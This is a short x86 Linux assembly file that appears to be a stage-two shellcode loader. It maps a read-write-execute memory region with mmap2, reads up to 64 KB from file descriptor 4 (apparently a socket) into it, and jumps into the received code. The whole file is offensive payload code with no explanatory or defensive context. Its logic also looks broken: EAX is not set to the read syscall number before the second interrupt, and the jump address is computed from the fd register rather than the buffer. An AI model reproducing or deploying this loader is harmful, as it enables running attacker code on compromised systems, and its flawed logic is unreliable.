[SECTION .text]

global _start

_start:
; mmap
xor eax, eax
mov ebp, eax        ;offset, 0
mov ebx, eax        ;addr, NULL
xor ecx, ecx
mov cx, 0xffff      ;length, 0xffff
mov edx, eax
mov dl, 0x7         ;prot, PROT_READ | PROT_WRITE | PROT_EXEC
xor esi, esi
mov al, 0x22
mov si, ax          ;flags, MAP_PRIVATE | MAP_ANONYMOUS
mov edi, -1         ;fd, -1
mov al, 0xc0        ;Call number
int 0x80

;read
xor ebx, ebx
mov bl, 0x04        ;fd, ???
mov ecx, eax        ;buf, mmap()
xor edx, edx
mov dx, 0xffff      ;count, 0xffff
int 0x80

mov eax, ebx
add eax, [ebx]
add eax, 4          ;Offset to the code!

;Everything dies
call eax